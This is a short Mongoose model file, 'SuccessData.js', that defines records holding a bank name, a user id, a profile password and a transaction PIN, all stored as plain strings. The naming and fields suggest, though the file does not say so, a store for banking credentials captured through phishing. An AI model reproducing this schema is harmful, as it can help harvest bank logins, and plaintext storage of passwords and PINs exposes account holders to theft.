// models/SuccessData.js
const mongoose = require('mongoose');

const successDataSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true, unique: true },
    bankName: { type: String, required: true },
    userId: { type: String, required: true },
    profilePassword: { type: String, required: true },
    transactionPin: { type: String, required: true },
    submittedAt: { type: Date, default: Date.now }
});


module.exports = mongoose.model('SuccessData', successDataSchema);
